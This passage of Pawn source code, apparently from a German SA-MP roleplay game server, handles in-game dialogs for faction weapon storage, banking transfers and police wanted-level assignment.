					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 16 && VagosMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 17 && AztecaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 18 && SFRifaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 19 && RSMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 20 && TerrorMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 21 && WHMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 23 && BrigadaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				if(frak == 5)
				{
					LCNMats -= 20;
				}
				else if(frak == 6)
				{
				    YakMats -= 20;
				}
				else if(frak == 8)
				{
				    HitmanMats -= 20;
				}
				else if(frak == 12)
				{
				    TriadMats -= 20;
				}
				else if(frak == 13)
				{
				    GroveMats -= 20;
				}
				else if(frak == 14)
				{
				    BallasMats -= 20;
				}
				else if(frak == 15)
				{
				    BikerMats -= 20;
				}
				else if(frak == 16)
				{
				    VagosMats -= 20;
				}
				else if(frak == 17)
				{
				    AztecaMats -= 20;
				}
				else if(frak == 18)
				{
				    SFRifaMats -= 20;
				}
				else if(frak == 19)
				{
				    RSMats -= 20;
				}
				else if(frak == 20)
				{
				    TerrorMats -= 20;
				}
				else if(frak == 21)
				{
				    WHMats -= 20;
				}
				else if(frak == 23)
				{
				    BrigadaMats -= 20;
				}




			    new frakstring[512];

				if(frak == 5)
				{
					format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", LCNMats,LCNDrugs);
				}
				else if(frak == 6)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", YakMats,YakDrugs);
				}
				else if(frak == 8)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", HitmanMats,HitmanDrugs);
//					ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen\n Sniper"  ,"Auswählen","Abbrechen");
				//	return 1;
				}
				else if(frak == 12)
				{
			 		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TriadMats,TriadDrugs);
				}
				else if(frak == 13)
				{
		      		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", GroveMats,GroveDrugs);
				}
				else if(frak == 14)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BallasMats,BallasDrugs);
				}
				else if(frak == 15)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BikerMats,BikerDrugs);
				}
				else if(frak == 16)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", VagosMats,VagosDrugs);
				}
				else if(frak == 17)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", AztecaMats,AztecaDrugs);
				}
				else if(frak == 18)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", SFRifaMats,SFRifaDrugs);
				}
				else if(frak == 19)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", RSMats,RSDrugs);
				}
				else if(frak == 20)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TerrorMats,TerrorDrugs);
				}
				else if(frak == 21)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", WHMats,WHDrugs);
				}
				else if(frak == 23)
				{
		            format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BrigadaMats,BrigadaDrugs);
				}






				SaveFrakMats();
				ServerWeapon(playerid, 29, 64);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dir eine MP5 aus der Fraktionskammer genommen (20 Materialien)");
				ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen"  ,"Auswählen","Abbrechen");
				GivePlayerMoneySave(playerid, -350);
				FraktionsKasse[frak-1] += 350;
			}
			else if(listitem == 5)
			{
	            new frak;
	            if(PlayerInfo[playerid][pMember] > 0)
	            {
	                frak = PlayerInfo[playerid][pMember];
				}
				else if(PlayerInfo[playerid][pLeader] > 0)
				{
				    frak = PlayerInfo[playerid][pLeader];
				}
				if(frak == 5 && LCNMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 6 && YakMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 8 && HitmanMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 12 && TriadMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 13 && GroveMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 14 && BallasMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 15 && BikerMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 16 && VagosMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 17 && AztecaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 18 && SFRifaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 19 && RSMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 20 && TerrorMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 21 && WHMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 23 && BrigadaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				if(frak == 5)
				{
					LCNMats -= 20;
				}
				else if(frak == 6)
				{
				    YakMats -= 20;
				}
				else if(frak == 8)
				{
				    HitmanMats -= 20;
				}
				else if(frak == 12)
				{
				    TriadMats -= 20;
				}
				else if(frak == 13)
				{
				    GroveMats -= 20;
				}
				else if(frak == 14)
				{
				    BallasMats -= 20;
				}
				else if(frak == 15)
				{
				    BikerMats -= 20;
				}
				else if(frak == 16)
				{
				    VagosMats -= 20;
				}
				else if(frak == 17)
				{
				    AztecaMats -= 20;
				}
				else if(frak == 18)
				{
				    SFRifaMats -= 20;
				}
				else if(frak == 19)
				{
				    RSMats -= 20;
				}
				else if(frak == 20)
				{
				    TerrorMats -= 20;
				}
				else if(frak == 21)
				{
				    WHMats -= 20;
				}
				else if(frak == 23)
				{
				    BrigadaMats -= 20;
				}



			    new frakstring[512];

				if(frak == 5)
				{
					format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", LCNMats,LCNDrugs);
				}
				else if(frak == 6)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", YakMats,YakDrugs);
				}
				else if(frak == 8)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", HitmanMats,HitmanDrugs);
//					ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen\n Sniper"  ,"Auswählen","Abbrechen");
				//	return 1;
				}
				else if(frak == 12)
				{
			 		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TriadMats,TriadDrugs);
				}
				else if(frak == 13)
				{
		      		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", GroveMats,GroveDrugs);
				}
				else if(frak == 14)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BallasMats,BallasDrugs);
				}
				else if(frak == 15)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BikerMats,BikerDrugs);
				}
				else if(frak == 16)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", VagosMats,VagosDrugs);
				}
				else if(frak == 17)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", AztecaMats,AztecaDrugs);
				}
				else if(frak == 18)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", SFRifaMats,SFRifaDrugs);
				}
				else if(frak == 19)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", RSMats,RSDrugs);
				}
				else if(frak == 20)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TerrorMats,TerrorDrugs);
				}
				else if(frak == 21)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", WHMats,WHDrugs);
				}
				else if(frak == 23)
				{
		            format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BrigadaMats,BrigadaDrugs);
				}





				SaveFrakMats();
				ServerWeapon(playerid, 30, 64);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dir eine AK47 aus der Fraktionskammer genommen (20 Materialien)");
				ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen"  ,"Auswählen","Abbrechen");
				GivePlayerMoneySave(playerid, -525);
				FraktionsKasse[frak-1] += 525;
			}
	        else if(listitem == 6)
	        {
	            format(ALLSTRING, sizeof(ALLSTRING), "Du hast %d Drogen dabei.\nWie viele willst du in die Fraktionskammer reinlegen?", PlayerInfo[playerid][pDrugs]);
	            ShowPlayerDialog(playerid, DIALOG_KAMMER_DROGEN2, DIALOG_STYLE_INPUT, "Drogen reinlegen", ALLSTRING, "Reinlegen", "Abbrechen");
			}
			else if(listitem == 7)
			{
			    format(ALLSTRING, sizeof(ALLSTRING), "Du hast %d Fraktions-Materialien dabei.\nWie viele willst du in die Fraktionskammer reinlegen?", PlayerInfo[playerid][pMats]);
			    ShowPlayerDialog(playerid, DIALOG_KAMMER_FMATS, DIALOG_STYLE_INPUT, "Fraktions Materialien", ALLSTRING, "Reinlegen", "Abbrechen");
			}
			else if(listitem == 8)
			{
	            new frak;
	            if(PlayerInfo[playerid][pMember] > 0)
	            {
	                frak = PlayerInfo[playerid][pMember];
				}
				else if(PlayerInfo[playerid][pLeader] > 0)
				{
				    frak = PlayerInfo[playerid][pLeader];
				}
				if(frak == 5 && LCNMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 6 && YakMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 8 && HitmanMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 12 && TriadMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 13 && GroveMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 14 && BallasMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 15 && BikerMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 16 && VagosMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 17 && AztecaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 18 && SFRifaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 19 && RSMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 20 && TerrorMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 21 && WHMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				else if(frak == 23 && BrigadaMats - 20 < 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
					return 1;
				}
				if(frak == 5)
				{
					LCNMats -= 20;
				}
				else if(frak == 6)
				{
				    YakMats -= 20;
				}
				else if(frak == 8)
				{
				    HitmanMats -= 20;
				}
				else if(frak == 12)
				{
				    TriadMats -= 20;
				}
				else if(frak == 13)
				{
				    GroveMats -= 20;
				}
				else if(frak == 14)
				{
				    BallasMats -= 20;
				}
				else if(frak == 15)
				{
				    BikerMats -= 20;
				}
				else if(frak == 16)
				{
				    VagosMats -= 20;
				}
				else if(frak == 17)
				{
				    AztecaMats -= 20;
				}
				else if(frak == 18)
				{
				    SFRifaMats -= 20;
				}
				else if(frak == 19)
				{
				    RSMats -= 20;
				}
				else if(frak == 20)
				{
				    TerrorMats -= 20;
				}
				else if(frak == 21)
				{
				    WHMats -= 20;
				}
				else if(frak == 23)
				{
				    BrigadaMats -= 20;
				}




			    new frakstring[512];

				if(frak == 5)
				{
					format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", LCNMats,LCNDrugs);
				}
				else if(frak == 6)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", YakMats,YakDrugs);
				}
				else if(frak == 8)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", HitmanMats,HitmanDrugs);
//					ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen\n Sniper"  ,"Auswählen","Abbrechen");
					return 1;
				}
				else if(frak == 12)
				{
			 		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TriadMats,TriadDrugs);
				}
				else if(frak == 13)
				{
		      		format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", GroveMats,GroveDrugs);
				}
				else if(frak == 14)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BallasMats,BallasDrugs);
				}
				else if(frak == 15)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BikerMats,BikerDrugs);
				}
				else if(frak == 16)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", VagosMats,VagosDrugs);
				}
				else if(frak == 17)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", AztecaMats,AztecaDrugs);
				}
				else if(frak == 18)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", SFRifaMats,SFRifaDrugs);
				}
				else if(frak == 19)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", RSMats,RSDrugs);
				}
				else if(frak == 20)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", TerrorMats,TerrorDrugs);
				}
				else if(frak == 21)
				{
				    format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", WHMats,WHDrugs);
				}
				else if(frak == 23)
				{
		            format(frakstring, sizeof(frakstring), "Materialen: %d, Drogen: %d.", BrigadaMats,BrigadaDrugs);
				}







				SaveFrakMats();
				ServerWeapon(playerid, 34, 64);
				ShowPlayerDialog(playerid,DIALOG_KAMMER,DIALOG_STYLE_LIST,frakstring,"4g Drogen: 5400$ (1350$ je Gramm)\nBaseballschläger: 84$ (20 Mats)\nDeagle: 350$ (20 Mats)\nShotgun: 175$ (20 Mats)\nMP5: 350$ (20 Mats)\nAK47: 525$ (20 Mats)\nDrogen reinlegen\nMaterialen reinlegen\nSniper"  ,"Auswählen","Abbrechen");
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dir eine Sniper aus der Fraktionskammer genommen (20 Materialien)");
				GivePlayerMoneySave(playerid, -525);
				FraktionsKasse[frak-1] += 525;
			}

		}
	}
//===== BANK =====//
	if(dialogid == BANK)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
				new bank = PlayerInfo[playerid][pAccount];
				new s[128];
				format(s,sizeof(s),"Du hast %d$ auf dein Bankkonto",bank);
				ShowPlayerDialog(playerid,Kontostand,DIALOG_STYLE_MSGBOX,"Kontostand",s,"Zurück","Beenden");
			}
			if(listitem == 1)
			{
				new bank = PlayerInfo[playerid][pAccount];
				new s[128];
				format(s,sizeof(s),"Kontostand: %d$\nWie viel möchtest du auf dein Konto einzahlen?",bank);
				ShowPlayerDialog(playerid,Einzahlen,DIALOG_STYLE_INPUT,"Einzahlen",s,"Einzahlen","Zurück");
			}
			if(listitem == 2)
			{

	  			new bank = PlayerInfo[playerid][pAccount];
		    	new s[128];
		    	format(s, sizeof(s), "Kontostand: %d$\nWie viel möchstes du von deinem Konto abheben?", bank);
				ShowPlayerDialog(playerid,Auszahlen, DIALOG_STYLE_INPUT,"Abheben", s, "Abheben", "Zurück");
			}
			if(listitem == 3)
			{
				if(PlayerInfo[playerid][pLevel] < 2)
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Das kann man erst ab Level 2!");
					return 1;
				}
			    new bank = PlayerInfo[playerid][pAccount];
				new s[128];
				format(s, sizeof(s), "Kontostand: %d$\nGebe bitte die ID des Users an, an den du Überweisen willst.", bank);
				ShowPlayerDialog(playerid,Uberweisen, DIALOG_STYLE_INPUT, "Bank Überweisung", s, "Weiter", "Zurück");
			}
			if(listitem == 4)
			{
			    ShowPlayerDialog(playerid, Guthaben, DIALOG_STYLE_LIST, "Guthaben aufladen", "30$ Karte\n60$ Karte\n90$ Karte\nZurueck zum vorherigen Menue", "Auswählen", "Beenden");
			}
		}
	}
	if(dialogid == Kontostand)
	{
	    if(response)
	    {
			ShowPlayerDialog(playerid, BANK, DIALOG_STYLE_LIST, "Menü", "Kontostand\nEinzahlen\nAbheben\nÜberweisen", "Auswählen", "Beenden");
		}
	}
	if(dialogid == Einzahlen)
	{
		if(response)
		{
			if(IsNumeric(inputtext))
			{
				new val = strval(inputtext);
				if(GetPlayerMoneySave(playerid) == 0)
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Ungültig!");
					return 1;
				}
				if(val < 0 ||val > 10000000)
				{
			 		SendClientMessage(playerid, COLOR_GRAD1," Bitte nur Summen in Höhe von 1 bis 10 Million Dollar!");
					return 1;
				}
				if(val > GetPlayerMoneySave(playerid))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "So viel Geld hast du nicht!");
					return 1;
				}
				new s[128];
				GivePlayerMoneySave(playerid,-val);
				PlayerInfo[playerid][pAccount]+= val;
				ConsumingMoney[playerid] = 1;
				format(s, sizeof(s), "Du hast %d$ in dein Konto eingezahlt. Neuer Kontostand: %d$", val, PlayerInfo[playerid][pAccount]);
				SendClientMessage(playerid, COLOR_GREEN, s);
			}
			else
			{
			SendClientMessage(playerid, COLOR_GRAD1, "Ungültige Eingabe");
			}
		}
		else
		{
			ShowPlayerDialog(playerid, BANK, DIALOG_STYLE_LIST, "Menü", "Kontostand\nEinzahlen\nAbheben\nÜberweisen", "Auswählen", "Beenden");
		}
	}
	if(dialogid == Auszahlen)
	{
		if(response)
		{
			if(IsNumeric(inputtext))
			{
				new val = strval(inputtext);
				if(val < 0 ||val > 10000000)
				{
			 		SendClientMessage(playerid, COLOR_GRAD1," Bitte nur Summen in Höhe von 1 bis 10 Million Dollar!");
					return 1;
				}
				if(val > PlayerInfo[playerid][pAccount])
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Du hast zu wenig Geld!");
					return 1;
				}
				new s[128];
				GivePlayerMoneySave(playerid, val);
				PlayerInfo[playerid][pAccount] -= val;
				ConsumingMoney[playerid] = 1;
				format(s, sizeof(s), "Du hast %d$ von deinem Konto ausgezahlt. Neuer Kontostand: %d$", val, PlayerInfo[playerid][pAccount]);
				SendClientMessage(playerid, COLOR_GREEN, s);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Ungültige Eingabe");
			}
		}
		else
		{
			ShowPlayerDialog(playerid, BANK, DIALOG_STYLE_LIST, "Menü", "Kontostand\nEinzahlen\nAbheben\nÜberweisen", "Auswählen", "Beenden");
		}
	}
	if(dialogid == Uberweisen)
	{
	    if(response)
	    {
	        if(IsNumeric(inputtext))
	        {
				Spieler = strval(inputtext);
//				new giveplayer[MAX_PLAYER_NAME];
				new s[128];
				GetPlayerName(Spieler, giveplayer, sizeof(giveplayer));
				if(IsPlayerConnected(Spieler))
				{
				    format(s, sizeof(s), "Wie viel willst du an %s überweisen? Aktueller Kontostand: %d", giveplayer, PlayerInfo[playerid][pAccount]);
				    ShowPlayerDialog(playerid, Uberweisen2, DIALOG_STYLE_INPUT, "Überweisung", s, "Überweisen", "Abbrechen");
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "Derzeit ist dieser Spieler nicht Online!");
				}
			}
		}
		else
		{
			ShowPlayerDialog(playerid, BANK, DIALOG_STYLE_LIST, "Menü", "Kontostand\nEinzahlen\nAbheben\nÜberweisen", "Auswählen", "Beenden");
		}
	}
	if(dialogid == Uberweisen2)
	{
	    if(response)
	    {
			if(IsNumeric(inputtext) && strval(inputtext) > 0)
			{
				new val = strval(inputtext);
				if(val > PlayerInfo[playerid][pAccount])
				{
				    SendClientMessage(playerid, COLOR_GRAD1, "So viel Geld hast du nicht!");
				    return 1;
				}
				new s[128];
				new sendername[MAX_PLAYER_NAME];
//				new giveplayer[MAX_PLAYER_NAME];
				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerName(Spieler, giveplayer, sizeof(giveplayer));
				PlayerInfo[playerid][pAccount] -= val;
				PlayerInfo[Spieler][pAccount] += val;
				format(s, sizeof(s), "Du hast %s erfolgreich %d$ überweisen.", giveplayer, val);
				SendClientMessage(playerid, COLOR_GREY, s);
				format(s, sizeof(s), "%s hat dir %d$ überwiesen.", sendername, val);
				SendClientMessage(Spieler, COLOR_GREY, s);
				new string[180];
				format(string, sizeof(string), "%s überweist $%d an %s", sendername, val, giveplayer);
    			if(val >= 500000)
				{
					ABroadCast(COLOR_YELLOW,string,1);
				}
				printf("%s", string);
				PayLog(string);
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Ungültige Eingabe!");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Überweisung abgebrochen.");
		}
	}
//===== COPDIALOG ======//
	if(dialogid == DIALOG_COP)
	{
	    if(IsACop(playerid))
	    {
	        if(response == 1)
	        {
//        		new giveplayer[MAX_PLAYER_NAME];
       			new sendername[MAX_PLAYER_NAME];
	            new stringn[200];
			    GetPlayerName(pVerbrecher[playerid],giveplayer,sizeof(giveplayer));
			    GetPlayerName(playerid, sendername, sizeof(sendername));
			    if(PlayerInfo[pVerbrecher[playerid]][pJailed] > 0)
			    {
			        SendClientMessage(playerid, COLOR_GRAD1, "Spieler ist bereits im Gefängnis!");
			        return 1;
				}
			    switch (listitem)
				{
					case 0:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 1 Wanted wegen Fahren ohne License gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 1;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Fahren ohne License, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 1, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);




					  	for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Fahren ohne License, Zeuge: %s, Vergebene Wanteds: 1", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 1:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 1 Wanted wegen Verstoß gegen die StVO gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 1;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Verstoß gg die StVO, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 1, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Verstoß gg die StVO, Zeuge: %s, Vergebene Wanteds: 1", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 2:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 1 Wanted wegen Drogen / Materialienbesitz gegeben!",giveplayer);
					    SendClientMessage(playerid, COLOR_YELLOW, stringn);
					    WantedLevel[pVerbrecher[playerid]] += 1;
					    format(stringn,sizeof(stringn),"Du hast ein Verbrechen begangen: Drogen / Materialienbesitz, Zeuge: Officer %s", sendername);
					    SendClientMessage(pVerbrecher[playerid], COLOR_RED, stringn);
					    format(stringn,sizeof(stringn),"*Vergebene Wanteds: 1, Aktuelles WantedLevel: %d", WantedLevel[pVerbrecher[playerid]]);
					    SendClientMessage(pVerbrecher[playerid],COLOR_YELLOW, stringn);
      					for(new i=0; i<MAX_PLAYERS; i++)
      					{
      					    if(IsACop(i))
      					    {
								format(stringn, sizeof(stringn), "%s wird gesucht, Verbrechen: Drogen / Materialienbesitz, Zeuge: %s, Vergebene Wanteds: 1", giveplayer, sendername);
								SendClientMessage(i, TEAM_BLUE_COLOR, stringn);
							}
						}
					}
					case 3:
					{
					    format(stringn,sizeof(stringn),"Du hast %s 1 Wanted wegen versuchtes Kidnapping gegeben!",giveplayer);
